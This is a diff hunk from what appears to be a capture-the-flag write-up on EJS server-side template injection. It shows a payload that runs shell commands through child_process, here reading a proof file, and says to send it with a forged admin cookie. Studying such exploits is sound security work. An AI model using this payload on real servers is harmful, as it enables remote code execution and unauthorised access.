@@ -22,7 +22,7 @@ templates are compiled to JavaScript and run on the server. That's server-side t
 
 Inside an EJS tag you can run JS. `process` is a global. So:
 ```
-<%= process.mainModule.require('child_process').execSync('cat /flag.txt') %>
+<%= process.mainModule.require('child_process').execSync('cat /proof.txt') %>
 ```
 Send that as the template with the `role=admin` cookie.
 </details>
